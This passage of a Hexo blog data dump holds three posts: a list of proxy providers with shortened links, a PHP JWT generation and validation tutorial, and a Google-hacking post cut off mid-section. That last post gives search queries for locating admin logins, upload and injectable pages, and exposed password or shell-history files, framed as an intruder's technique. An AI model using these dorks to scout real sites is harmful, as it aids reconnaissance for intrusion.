title=\"RixCloud\"></a>RixCloud</h3><p>全部节点BGP中继阿里云机房（500M/300M/200M） 虽然看起来延迟比直连要高一些，但是实际起速要比直连还快很多，而且稳定</p>\n<p>官网：<a href=\"https://bit.ly/2M7G1Rm\" target=\"_blank\" rel=\"noopener\">https://bit.ly/2M7G1Rm</a></p>\n<h3 id=\"ssrcloud\"><a href=\"#ssrcloud\" class=\"headerlink\" title=\"ssrcloud\"></a>ssrcloud</h3><p>性价比也很好，部分线路0.1倍率。  180+节点，新增多条BGP线路</p>\n<p>网站：<a href=\"https://bit.ly/2IvnxVW\" target=\"_blank\" rel=\"noopener\">https://bit.ly/2IvnxVW</a></p>\n<h3 id=\"MunCloud\"><a href=\"#MunCloud\" class=\"headerlink\" title=\"MunCloud\"></a>MunCloud</h3><p>新增部分阿里云内网专线。总体来说还算不错的一家，性价比不错。60+节点。</p>\n<p>网站：<a href=\"https://bit.ly/2QOlRdV\" target=\"_blank\" rel=\"noopener\">https://bit.ly/2QOlRdV</a></p>\n<h3 id=\"百草园\"><a href=\"#百草园\" class=\"headerlink\" title=\"百草园\"></a>百草园</h3><p>晚高峰测了测，速度还算不错，流量给的也很足</p>\n<p>官网：<a href=\"https://bit.ly/2wDqDkX\" target=\"_blank\" rel=\"noopener\">https://bit.ly/2wDqDkX</a></p>\n<h3 id=\"次元链接\"><a href=\"#次元链接\" class=\"headerlink\" title=\"次元链接\"></a>次元链接</h3><p>也是一家大站了，之前在youtube上见过，人数不少，试了试总体速度还不错，性价比还可以。总节点数90+</p>\n<p>官网：<a href=\"https://k0.pw/vrrno1\" target=\"_blank\" rel=\"noopener\">https://k0.pw/vrrno1</a></p>\n<h3 id=\"SWCloud星愿云\"><a href=\"#SWCloud星愿云\" class=\"headerlink\" title=\"SWCloud星愿云\"></a>SWCloud星愿云</h3><p>试速度还可以，性价比也OK。总节点数50+</p>\n<p>官网： <a href=\"https://bit.ly/2MN614G\" target=\"_blank\" rel=\"noopener\">https://bit.ly/2MN614G</a></p>\n<h3 id=\"CTCloud\"><a href=\"#CTCloud\" class=\"headerlink\" title=\"CTCloud\"></a>CTCloud</h3><p>晚高峰的时候测过几天速，还不错，价钱也不贵，性价比还可以，线路大概在40条</p>\n<p>官网：<a href=\"https://bit.ly/2K25mcR\" target=\"_blank\" rel=\"noopener\">https://bit.ly/2K25mcR</a></p>\n<h3 id=\"STC-server\"><a href=\"#STC-server\" class=\"headerlink\" title=\"STC-server\"></a>STC-server</h3><p>不过速度还不错，性价比不错</p>\n<p>官网：<a href=\"https://bit.ly/2IsvRFI\" target=\"_blank\" rel=\"noopener\">https://bit.ly/2IsvRFI</a></p>\n<h3 id=\"BigHead\"><a href=\"#BigHead\" class=\"headerlink\" title=\"BigHead\"></a>BigHead</h3><p>一家运营快一年的机场，之前是公益机场，现在主打AZ节点</p>\n<p>官网：<a href=\"https://bit.ly/2VPGjM9\" target=\"_blank\" rel=\"noopener\">https://bit.ly/2VPGjM9</a></p>\n<p>TG： <a href=\"https://t.me/BigHeadSSRV2ray\" target=\"_blank\" rel=\"noopener\">https://t.me/BigHeadSSRV2ray</a></p>\n<h3 id=\"Catchflying\"><a href=\"#Catchflying\" class=\"headerlink\" title=\"Catchflying\"></a>Catchflying</h3><p>速度还不错。35+节点</p>\n<p>官网：<a href=\"https://bit.ly/2F7O3DH\" target=\"_blank\" rel=\"noopener\">https://bit.ly/2F7O3DH</a></p>\n<p>TG： <a href=\"https://t.me/catchflying\" target=\"_blank\" rel=\"noopener\">https://t.me/catchflying</a></p>\n<h3 id=\"AAEX\"><a href=\"#AAEX\" class=\"headerlink\" title=\"AAEX\"></a>AAEX</h3><p>大概有45+节点</p>\n<p>官网：<a href=\"https://bit.ly/2VRui99\" target=\"_blank\" rel=\"noopener\">https://bit.ly/2VRui99</a></p>\n<h3 id=\"Dler-Cloud\"><a href=\"#Dler-Cloud\" class=\"headerlink\" title=\"Dler Cloud\"></a>Dler Cloud</h3><p>机场包括部分中继节点，港台日等地区节点也挺多，150+节点，包括国际标准节点、国际高级节点、国际优化节点、中国大陆节点等等。</p>\n<p>注册购买: <a href=\"https://dlercloud.io\" target=\"_blank\" rel=\"noopener\">https://dlercloud.io</a><br>官方网站: <a href=\"https://dlercloud.io\" target=\"_blank\" rel=\"noopener\">https://dlercloud.io</a></p>"},{"layout":"post","title":"轻松生成jwt的插件","abbrlink":60442,"date":"2019-05-28T08:50:45.000Z","_content":"\n\n### 前言\n\njson web token，无需多说\n\n<!--more-->\n\n### 安装\n\n```shell\ncomposer require lcobucci/jwt\n```\n\n### 参数说明\n\n- iss 【issuer】发布者的url地址\n- aud 【audience】接受者的url地址\n- sub 【subject】该JWT所面向的用户，用于处理特定应用，不是常用的字段\n- exp 【expiration】 该jwt销毁的时间；unix时间戳\n- nbf 【not before】 该jwt的使用时间不能早于该时间；unix时间戳\n- iat 【issued at】 该jwt的发布时间；unix 时间戳\n- jti 【JWT ID】该jwt的唯一ID编号\n\n\n### 生成token\n\n```php\n<?php\n\nrequire './vendor/autoload.php';\n\nuse Lcobucci\\JWT\\Builder;\nuse Lcobucci\\JWT\\Signer\\Hmac\\Sha256;\nuse Lcobucci\\JWT\\Signer\\Key;\n\n//发布端url\n$iss = 'http://admin.jwt.com';\n//请求端URL\n$aud = 'http://api.jwt.com/user/login';\n//唯一的jwt id\n$jwt_id = 'jwt123';\n//私钥，用于token验证\n$signer_key = 'jwt-test';\n\n$signer = new Sha256();\n\n$token = (new Builder())->issuedBy($iss)\n                        ->permittedFor($aud)\n                        ->identifiedBy($jwt_id, true)\n                        ->issuedAt(time())\n                        ->canOnlyBeUsedAfter(time() + 60)\n                        ->expiresAt(time() + 3600)\n                        ->set('user', ['name' => 'police', 'mobile' => '110'])\n                        ->withClaim('uid', 1)\n                        ->getToken($signer, new Key($signer_key));\necho $token;\n\n```\n\n### 验证token\n\n```php\n\n<?php\nrequire './vendor/autoload.php';\n\nuse Lcobucci\\JWT\\ValidationData;\nuse Lcobucci\\JWT\\Parser;\nuse Lcobucci\\JWT\\Signer\\Hmac\\Sha256;\n\n$token  = $_GET['token'] ?? '';\n$token  = (new Parser())->parse((string) $token);\n$signer = new Sha256();\n\n$aud    = $token->getClaim('aud');\n$iss    = $token->getClaim('iss');\n$jwt_id = $token->getHeader('jti');\n$user   = $token->getClaim('user');\n\n\n$signer_key = 'jwt-test';  //私钥\n\n$data = new ValidationData();\n\n$data->setIssuer($iss);\n$data->setAudience($aud);\n$data->setId($jwt_id);\n\n//验证私钥\nvar_dump($token->verify($signer, $signer_key));\n\n//失败，因为token在60秒后方可验证\nvar_dump($token->validate($data));\n\n//修改验证时间\n$data->setCurrentTime(time() + 60);\n\n// true\nvar_dump($token->validate($data));\n\n$data->setCurrentTime(time() + 4000);\n\n//false,token过期\nvar_dump($token->validate($data));\n\n```","source":"_posts/2019/5/轻松生成jwt的插件.md","raw":"---\nlayout: post\ntitle: 轻松生成jwt的插件\ntags:\n  - php\ncategories:\n  - php\nabbrlink: 60442\ndate: 2019-05-28 16:50:45\n---\n\n\n### 前言\n\njson web token，无需多说\n\n<!--more-->\n\n### 安装\n\n```shell\ncomposer require lcobucci/jwt\n```\n\n### 参数说明\n\n- iss 【issuer】发布者的url地址\n- aud 【audience】接受者的url地址\n- sub 【subject】该JWT所面向的用户，用于处理特定应用，不是常用的字段\n- exp 【expiration】 该jwt销毁的时间；unix时间戳\n- nbf 【not before】 该jwt的使用时间不能早于该时间；unix时间戳\n- iat 【issued at】 该jwt的发布时间；unix 时间戳\n- jti 【JWT ID】该jwt的唯一ID编号\n\n\n### 生成token\n\n```php\n<?php\n\nrequire './vendor/autoload.php';\n\nuse Lcobucci\\JWT\\Builder;\nuse Lcobucci\\JWT\\Signer\\Hmac\\Sha256;\nuse Lcobucci\\JWT\\Signer\\Key;\n\n//发布端url\n$iss = 'http://admin.jwt.com';\n//请求端URL\n$aud = 'http://api.jwt.com/user/login';\n//唯一的jwt id\n$jwt_id = 'jwt123';\n//私钥，用于token验证\n$signer_key = 'jwt-test';\n\n$signer = new Sha256();\n\n$token = (new Builder())->issuedBy($iss)\n                        ->permittedFor($aud)\n                        ->identifiedBy($jwt_id, true)\n                        ->issuedAt(time())\n                        ->canOnlyBeUsedAfter(time() + 60)\n                        ->expiresAt(time() + 3600)\n                        ->set('user', ['name' => 'police', 'mobile' => '110'])\n                        ->withClaim('uid', 1)\n                        ->getToken($signer, new Key($signer_key));\necho $token;\n\n```\n\n### 验证token\n\n```php\n\n<?php\nrequire './vendor/autoload.php';\n\nuse Lcobucci\\JWT\\ValidationData;\nuse Lcobucci\\JWT\\Parser;\nuse Lcobucci\\JWT\\Signer\\Hmac\\Sha256;\n\n$token  = $_GET['token'] ?? '';\n$token  = (new Parser())->parse((string) $token);\n$signer = new Sha256();\n\n$aud    = $token->getClaim('aud');\n$iss    = $token->getClaim('iss');\n$jwt_id = $token->getHeader('jti');\n$user   = $token->getClaim('user');\n\n\n$signer_key = 'jwt-test';  //私钥\n\n$data = new ValidationData();\n\n$data->setIssuer($iss);\n$data->setAudience($aud);\n$data->setId($jwt_id);\n\n//验证私钥\nvar_dump($token->verify($signer, $signer_key));\n\n//失败，因为token在60秒后方可验证\nvar_dump($token->validate($data));\n\n//修改验证时间\n$data->setCurrentTime(time() + 60);\n\n// true\nvar_dump($token->validate($data));\n\n$data->setCurrentTime(time() + 4000);\n\n//false,token过期\nvar_dump($token->validate($data));\n\n```","slug":"2019/5/轻松生成jwt的插件","published":1,"updated":"2020-04-12T06:34:43.623Z","comments":1,"photos":[],"link":"","_id":"ck9z76vzr001b44vqbdqhut86","content":"<h3 id=\"前言\"><a href=\"#前言\" class=\"headerlink\" title=\"前言\"></a>前言</h3><p>json web token，无需多说</p>\n<a id=\"more\"></a>\n<h3 id=\"安装\"><a href=\"#安装\" class=\"headerlink\" title=\"安装\"></a>安装</h3><figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">composer require lcobucci/jwt</span><br></pre></td></tr></table></figure>\n<h3 id=\"参数说明\"><a href=\"#参数说明\" class=\"headerlink\" title=\"参数说明\"></a>参数说明</h3><ul>\n<li>iss 【issuer】发布者的url地址</li>\n<li>aud 【audience】接受者的url地址</li>\n<li>sub 【subject】该JWT所面向的用户，用于处理特定应用，不是常用的字段</li>\n<li>exp 【expiration】 该jwt销毁的时间；unix时间戳</li>\n<li>nbf 【not before】 该jwt的使用时间不能早于该时间；unix时间戳</li>\n<li>iat 【issued at】 该jwt的发布时间；unix 时间戳</li>\n<li>jti 【JWT ID】该jwt的唯一ID编号</li>\n</ul>\n<h3 id=\"生成token\"><a href=\"#生成token\" class=\"headerlink\" title=\"生成token\"></a>生成token</h3><figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">require</span> <span class=\"string\">'./vendor/autoload.php'</span>;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">use</span> <span class=\"title\">Lcobucci</span>\\<span class=\"title\">JWT</span>\\<span class=\"title\">Builder</span>;</span><br><span class=\"line\"><span class=\"keyword\">use</span> <span class=\"title\">Lcobucci</span>\\<span class=\"title\">JWT</span>\\<span class=\"title\">Signer</span>\\<span class=\"title\">Hmac</span>\\<span class=\"title\">Sha256</span>;</span><br><span class=\"line\"><span class=\"keyword\">use</span> <span class=\"title\">Lcobucci</span>\\<span class=\"title\">JWT</span>\\<span class=\"title\">Signer</span>\\<span class=\"title\">Key</span>;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">//发布端url</span></span><br><span class=\"line\">$iss = <span class=\"string\">'http://admin.jwt.com'</span>;</span><br><span class=\"line\"><span class=\"comment\">//请求端URL</span></span><br><span class=\"line\">$aud = <span class=\"string\">'http://api.jwt.com/user/login'</span>;</span><br><span class=\"line\"><span class=\"comment\">//唯一的jwt id</span></span><br><span class=\"line\">$jwt_id = <span class=\"string\">'jwt123'</span>;</span><br><span class=\"line\"><span class=\"comment\">//私钥，用于token验证</span></span><br><span class=\"line\">$signer_key = <span class=\"string\">'jwt-test'</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">$signer = <span class=\"keyword\">new</span> Sha256();</span><br><span class=\"line\"></span><br><span class=\"line\">$token = (<span class=\"keyword\">new</span> Builder())-&gt;issuedBy($iss)</span><br><span class=\"line\">                        -&gt;permittedFor($aud)</span><br><span class=\"line\">                        -&gt;identifiedBy($jwt_id, <span class=\"keyword\">true</span>)</span><br><span class=\"line\">                        -&gt;issuedAt(time())</span><br><span class=\"line\">                        -&gt;canOnlyBeUsedAfter(time() + <span class=\"number\">60</span>)</span><br><span class=\"line\">                        -&gt;expiresAt(time() + <span class=\"number\">3600</span>)</span><br><span class=\"line\">                        -&gt;set(<span class=\"string\">'user'</span>, [<span class=\"string\">'name'</span> =&gt; <span class=\"string\">'police'</span>, <span class=\"string\">'mobile'</span> =&gt; <span class=\"string\">'110'</span>])</span><br><span class=\"line\">                        -&gt;withClaim(<span class=\"string\">'uid'</span>, <span class=\"number\">1</span>)</span><br><span class=\"line\">                        -&gt;getToken($signer, <span class=\"keyword\">new</span> Key($signer_key));</span><br><span class=\"line\"><span class=\"keyword\">echo</span> $token;</span><br></pre></td></tr></table></figure>\n<h3 id=\"验证token\"><a href=\"#验证token\" class=\"headerlink\" title=\"验证token\"></a>验证token</h3><figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"></span><br><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\"><span class=\"keyword\">require</span> <span class=\"string\">'./vendor/autoload.php'</span>;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">use</span> <span class=\"title\">Lcobucci</span>\\<span class=\"title\">JWT</span>\\<span class=\"title\">ValidationData</span>;</span><br><span class=\"line\"><span class=\"keyword\">use</span> <span class=\"title\">Lcobucci</span>\\<span class=\"title\">JWT</span>\\<span class=\"title\">Parser</span>;</span><br><span class=\"line\"><span class=\"keyword\">use</span> <span class=\"title\">Lcobucci</span>\\<span class=\"title\">JWT</span>\\<span class=\"title\">Signer</span>\\<span class=\"title\">Hmac</span>\\<span class=\"title\">Sha256</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">$token  = $_GET[<span class=\"string\">'token'</span>] ?? <span class=\"string\">''</span>;</span><br><span class=\"line\">$token  = (<span class=\"keyword\">new</span> Parser())-&gt;parse((string) $token);</span><br><span class=\"line\">$signer = <span class=\"keyword\">new</span> Sha256();</span><br><span class=\"line\"></span><br><span class=\"line\">$aud    = $token-&gt;getClaim(<span class=\"string\">'aud'</span>);</span><br><span class=\"line\">$iss    = $token-&gt;getClaim(<span class=\"string\">'iss'</span>);</span><br><span class=\"line\">$jwt_id = $token-&gt;getHeader(<span class=\"string\">'jti'</span>);</span><br><span class=\"line\">$user   = $token-&gt;getClaim(<span class=\"string\">'user'</span>);</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">$signer_key = <span class=\"string\">'jwt-test'</span>;  <span class=\"comment\">//私钥</span></span><br><span class=\"line\"></span><br><span class=\"line\">$data = <span class=\"keyword\">new</span> ValidationData();</span><br><span class=\"line\"></span><br><span class=\"line\">$data-&gt;setIssuer($iss);</span><br><span class=\"line\">$data-&gt;setAudience($aud);</span><br><span class=\"line\">$data-&gt;setId($jwt_id);</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">//验证私钥</span></span><br><span class=\"line\">var_dump($token-&gt;verify($signer, $signer_key));</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">//失败，因为token在60秒后方可验证</span></span><br><span class=\"line\">var_dump($token-&gt;validate($data));</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">//修改验证时间</span></span><br><span class=\"line\">$data-&gt;setCurrentTime(time() + <span class=\"number\">60</span>);</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// true</span></span><br><span class=\"line\">var_dump($token-&gt;validate($data));</span><br><span class=\"line\"></span><br><span class=\"line\">$data-&gt;setCurrentTime(time() + <span class=\"number\">4000</span>);</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">//false,token过期</span></span><br><span class=\"line\">var_dump($token-&gt;validate($data));</span><br></pre></td></tr></table></figure>","site":{"data":{}},"excerpt":"<h3 id=\"前言\"><a href=\"#前言\" class=\"headerlink\" title=\"前言\"></a>前言</h3><p>json web token，无需多说</p>","more":"<h3 id=\"安装\"><a href=\"#安装\" class=\"headerlink\" title=\"安装\"></a>安装</h3><figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">composer require lcobucci/jwt</span><br></pre></td></tr></table></figure>\n<h3 id=\"参数说明\"><a href=\"#参数说明\" class=\"headerlink\" title=\"参数说明\"></a>参数说明</h3><ul>\n<li>iss 【issuer】发布者的url地址</li>\n<li>aud 【audience】接受者的url地址</li>\n<li>sub 【subject】该JWT所面向的用户，用于处理特定应用，不是常用的字段</li>\n<li>exp 【expiration】 该jwt销毁的时间；unix时间戳</li>\n<li>nbf 【not before】 该jwt的使用时间不能早于该时间；unix时间戳</li>\n<li>iat 【issued at】 该jwt的发布时间；unix 时间戳</li>\n<li>jti 【JWT ID】该jwt的唯一ID编号</li>\n</ul>\n<h3 id=\"生成token\"><a href=\"#生成token\" class=\"headerlink\" title=\"生成token\"></a>生成token</h3><figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">require</span> <span class=\"string\">'./vendor/autoload.php'</span>;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">use</span> <span class=\"title\">Lcobucci</span>\\<span class=\"title\">JWT</span>\\<span class=\"title\">Builder</span>;</span><br><span class=\"line\"><span class=\"keyword\">use</span> <span class=\"title\">Lcobucci</span>\\<span class=\"title\">JWT</span>\\<span class=\"title\">Signer</span>\\<span class=\"title\">Hmac</span>\\<span class=\"title\">Sha256</span>;</span><br><span class=\"line\"><span class=\"keyword\">use</span> <span class=\"title\">Lcobucci</span>\\<span class=\"title\">JWT</span>\\<span class=\"title\">Signer</span>\\<span class=\"title\">Key</span>;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">//发布端url</span></span><br><span class=\"line\">$iss = <span class=\"string\">'http://admin.jwt.com'</span>;</span><br><span class=\"line\"><span class=\"comment\">//请求端URL</span></span><br><span class=\"line\">$aud = <span class=\"string\">'http://api.jwt.com/user/login'</span>;</span><br><span class=\"line\"><span class=\"comment\">//唯一的jwt id</span></span><br><span class=\"line\">$jwt_id = <span class=\"string\">'jwt123'</span>;</span><br><span class=\"line\"><span class=\"comment\">//私钥，用于token验证</span></span><br><span class=\"line\">$signer_key = <span class=\"string\">'jwt-test'</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">$signer = <span class=\"keyword\">new</span> Sha256();</span><br><span class=\"line\"></span><br><span class=\"line\">$token = (<span class=\"keyword\">new</span> Builder())-&gt;issuedBy($iss)</span><br><span class=\"line\">                        -&gt;permittedFor($aud)</span><br><span class=\"line\">                        -&gt;identifiedBy($jwt_id, <span class=\"keyword\">true</span>)</span><br><span class=\"line\">                        -&gt;issuedAt(time())</span><br><span class=\"line\">                        -&gt;canOnlyBeUsedAfter(time() + <span class=\"number\">60</span>)</span><br><span class=\"line\">                        -&gt;expiresAt(time() + <span class=\"number\">3600</span>)</span><br><span class=\"line\">                        -&gt;set(<span class=\"string\">'user'</span>, [<span class=\"string\">'name'</span> =&gt; <span class=\"string\">'police'</span>, <span class=\"string\">'mobile'</span> =&gt; <span class=\"string\">'110'</span>])</span><br><span class=\"line\">                        -&gt;withClaim(<span class=\"string\">'uid'</span>, <span class=\"number\">1</span>)</span><br><span class=\"line\">                        -&gt;getToken($signer, <span class=\"keyword\">new</span> Key($signer_key));</span><br><span class=\"line\"><span class=\"keyword\">echo</span> $token;</span><br></pre></td></tr></table></figure>\n<h3 id=\"验证token\"><a href=\"#验证token\" class=\"headerlink\" title=\"验证token\"></a>验证token</h3><figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"></span><br><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\"><span class=\"keyword\">require</span> <span class=\"string\">'./vendor/autoload.php'</span>;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">use</span> <span class=\"title\">Lcobucci</span>\\<span class=\"title\">JWT</span>\\<span class=\"title\">ValidationData</span>;</span><br><span class=\"line\"><span class=\"keyword\">use</span> <span class=\"title\">Lcobucci</span>\\<span class=\"title\">JWT</span>\\<span class=\"title\">Parser</span>;</span><br><span class=\"line\"><span class=\"keyword\">use</span> <span class=\"title\">Lcobucci</span>\\<span class=\"title\">JWT</span>\\<span class=\"title\">Signer</span>\\<span class=\"title\">Hmac</span>\\<span class=\"title\">Sha256</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">$token  = $_GET[<span class=\"string\">'token'</span>] ?? <span class=\"string\">''</span>;</span><br><span class=\"line\">$token  = (<span class=\"keyword\">new</span> Parser())-&gt;parse((string) $token);</span><br><span class=\"line\">$signer = <span class=\"keyword\">new</span> Sha256();</span><br><span class=\"line\"></span><br><span class=\"line\">$aud    = $token-&gt;getClaim(<span class=\"string\">'aud'</span>);</span><br><span class=\"line\">$iss    = $token-&gt;getClaim(<span class=\"string\">'iss'</span>);</span><br><span class=\"line\">$jwt_id = $token-&gt;getHeader(<span class=\"string\">'jti'</span>);</span><br><span class=\"line\">$user   = $token-&gt;getClaim(<span class=\"string\">'user'</span>);</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">$signer_key = <span class=\"string\">'jwt-test'</span>;  <span class=\"comment\">//私钥</span></span><br><span class=\"line\"></span><br><span class=\"line\">$data = <span class=\"keyword\">new</span> ValidationData();</span><br><span class=\"line\"></span><br><span class=\"line\">$data-&gt;setIssuer($iss);</span><br><span class=\"line\">$data-&gt;setAudience($aud);</span><br><span class=\"line\">$data-&gt;setId($jwt_id);</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">//验证私钥</span></span><br><span class=\"line\">var_dump($token-&gt;verify($signer, $signer_key));</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">//失败，因为token在60秒后方可验证</span></span><br><span class=\"line\">var_dump($token-&gt;validate($data));</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">//修改验证时间</span></span><br><span class=\"line\">$data-&gt;setCurrentTime(time() + <span class=\"number\">60</span>);</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// true</span></span><br><span class=\"line\">var_dump($token-&gt;validate($data));</span><br><span class=\"line\"></span><br><span class=\"line\">$data-&gt;setCurrentTime(time() + <span class=\"number\">4000</span>);</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">//false,token过期</span></span><br><span class=\"line\">var_dump($token-&gt;validate($data));</span><br></pre></td></tr></table></figure>"},{"layout":"post","title":"GoogleHacking","abbrlink":47235,"_content":"\n### 前言\n\nGoogle hacker (Google黑客)是利用GOOGLE提供的搜索功能查找黑客们想找到的信息，一般是查找网站后台，网管的个人信息，也可以用来查找某人在网络上的活动\n\nGoogle hacker 一般是做为黑客在入侵时的一个手段，在入侵过程中有时需要查找后台的登陆口就需要用到GOOGLE HACKER，有时猜解密码的时候google也是提供查找管理员资料的有效平台\n\n<!--more-->\n\n### 常用语法\n\n#### intext\n\n这个就是把网页中的正文内容中的某个字符做为搜索条件，例如在google里输入`intext:动漫`，将返回所有在网页正文部分包含”动漫”的网页，`allintext:`使用方法和`intext`类似\n\n#### intitle\n\n和intext差不多，搜索网页标题中是否有所要找的字符，例如搜索:`intitle:安全天使`，将返回所有网页标题中包含”安全天使”的网页，同理`allintitle:`也同`intitle`类似\n\n#### cache\n\n搜索google里关于某些内容的缓存，也许能找到一些好东西\n\n#### define\n\n搜索某个词语的定义，搜索:`define:hacker`，将返回关于hacker的定义\n\n#### filetype\n\n搜索指定类型的文件，撒网式攻击还是对特定目标进行信息收集都需要用到这个，例如输入:`filetype:doc`，将返回所有以doc结尾的文件URL，如果找.bak、.mdb或.inc也是可以的，获得的信息也许会更丰富\n\n\n#### info\n\n查找指定站点的一些基本信息\n\n#### inurl\n\n搜索:`inurl:www.123.net`可以返回所有和`www.123.net`做了链接的URL\n\n#### site\n\n搜索:`site:www.123.net`，将返回所有和123.net这个站有关的URL\n\n还有一些操作符也是很有用的:\n\n```\n– 把某个字忽略\n\n~ 同意词\n\n. 单一的通配符\n\n“” 精确查询\n```\n\n### 典型用法\n\n- 找管理后台地址\n\n```\nsite:xxx.com intext：管理后台登陆用户名密码系統账号\n\nsite:xxx.com inurl: login/admin/manage/manager/adminlogin/system \n\nsite:xxx.com intitle 管理后台登陆\n```\n\n- 找上传类漏洞地址：\n\n```\nsite:xxx.com inurl:file \n\nsite:xxx.com inurl:upload \n```\n\n- 找注入页面\n\n```\nsite:xxx.com inurl:php?id=\n```\n\n- 找编辑器页面\n\n```\nsite:xxx.com inurl:ewebeditor\n```\n\n### 实际应用\n\n对于攻击者来说，可能最感兴趣的就是密码文件了，而google正因为其强大的搜索能力往往会把一些敏感信息透露出来，用google搜索以下内容\n\n```\nintitle:”index of” etc\n\nintitle:”Index of” .sh_history\n\nintitle:”Index of” 